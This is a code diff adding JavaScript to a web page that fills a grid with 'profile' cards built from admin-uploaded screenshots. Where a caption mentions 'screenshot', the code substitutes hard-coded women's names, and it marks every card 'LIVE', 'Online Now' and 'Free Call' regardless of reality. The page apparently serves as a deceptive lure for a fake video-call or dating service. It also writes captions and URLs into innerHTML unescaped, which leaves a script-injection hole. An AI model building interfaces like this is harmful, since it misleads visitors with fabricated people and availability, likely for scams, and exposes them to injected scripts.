+    // Render Profiles Grid from Admin Screenshots
+    function renderProfilesGrid(screenshots) {
+      const grid = document.getElementById('profiles-content-grid');
+      if (!grid || !screenshots || screenshots.length === 0) return;
+
+      const defaultNames = ['Zoya Khan', 'Kanika Singh', 'Pooja', 'Maya', 'Aarohi', 'Simran', 'Rhea', 'Ananya'];
+
+      grid.innerHTML = screenshots.map((item, idx) => {
+        let name = item.caption && !item.caption.toLowerCase().includes('screenshot')
+          ? item.caption
+          : (defaultNames[idx % defaultNames.length] || ('Live User #' + (idx + 1)));
+
+        return `
+          <div class="media-card trigger-popup" data-id="${item.id}">
+            <div class="live-badge">LIVE</div>
+            <img src="${item.url}" alt="${name}" loading="lazy" />
+            <div class="card-overlay">
+              <div class="card-info">
+                <h2 class="card-title">${name}</h2>
+                <div class="card-subtext"><i class="fa-solid fa-circle" style="font-size: 7px; color: #22c55e;"></i> Online Now</div>
+                <div class="card-meta"><i class="fa-solid fa-video"></i> Free Call</div>
+              </div>
+              <div class="card-video-btn"><i class="fa-solid fa-video"></i></div>
+            </div>
+          </div>
+        `;
+      }).join('');
+
+      // Re-bind click events to new cards
+      bindPopupTriggers();
+    }
+
+    // Initialize on DOM load
+    document.addEventListener('DOMContentLoaded', () => {
+      bindPopupTriggers();
+      initDynamicConfig();
+    });
+  </script>
+
+</body>
+</html>
